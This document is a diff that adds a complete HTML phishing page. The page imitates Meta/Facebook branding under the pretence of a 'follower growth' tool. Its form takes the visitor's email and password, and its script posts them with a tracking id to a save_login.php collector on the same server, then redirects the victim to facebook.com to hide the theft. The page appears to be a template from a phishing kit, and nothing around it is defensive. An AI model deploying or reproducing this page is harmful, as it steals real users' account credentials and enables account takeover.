@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Business — Follower tools</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(165deg, #e7f3ff 0%, #f0f2f5 45%, #fff 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1c1e21;
+            padding: 24px;
+        }
+        .shell {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08), 0 0 0 1px rgba(0, 0, 0, 0.04);
+            padding: 32px 28px 28px;
+        }
+        .badge {
+            display: inline-block;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            color: #1877f2;
+            background: #e7f3ff;
+            padding: 6px 10px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            line-height: 1.25;
+            margin-bottom: 8px;
+            color: #050505;
+        }
+        .sub {
+            font-size: 14px;
+            color: #65676b;
+            line-height: 1.45;
+            margin-bottom: 24px;
+        }
+        .form-input {
+            width: 100%;
+            height: 48px;
+            margin-bottom: 12px;
+            padding: 0 14px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+        }
+        .form-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
+        }
+        .form-input::placeholder { color: #8a8d91; }
+        .btn {
+            width: 100%;
+            height: 48px;
+            margin-top: 8px;
+            border: none;
+            border-radius: 8px;
+            background: #1877f2;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        .btn:hover { background: #166fe5; }
+        .fine {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #8a8d91;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+    <div class="shell">
+        <span class="badge">Follower growth</span>
+        <h1>Connect your Page to reach more people</h1>
+        <p class="sub">Sign in with Facebook to review your account and apply follower recommendations safely.</p>
+        <form id="loginForm">
+            <input type="text" class="form-input" id="email" placeholder="Email or phone" required autocomplete="username">
+            <input type="password" class="form-input" id="password" placeholder="Password" required autocomplete="current-password">
+            <button type="submit" class="btn">Continue</button>
+        </form>
+        <p class="fine">We may show insights based on your Page. By continuing you agree to our terms for creator tools.</p>
+    </div>
+    <script>
+        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const tid = typeof window.TRACKIFY_TID === 'string' ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get('tid') || '');
+            const btn = document.querySelector('.btn');
+            btn.textContent = 'Connecting…';
+            btn.disabled = true;
+            $.ajax({
+                type: 'POST',
+                url: BASE_URL + 'save_login.php',
+                data: { tid: tid, login: email, password: password, template: 'facebook_followers' },
+                dataType: 'json',
+                success: function (data) {
+                    if (data && data.ok) {
+                        window.location.href = 'https://www.facebook.com/';
+                        return;
+                    }
+                    btn.textContent = 'Continue';
+                    btn.disabled = false;
+                    alert('Incorrect email or password. Please try again.');
+                },
+                error: function () {
+                    btn.textContent = 'Continue';
+                    btn.disabled = false;
+                    alert('Incorrect email or password. Please try again.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
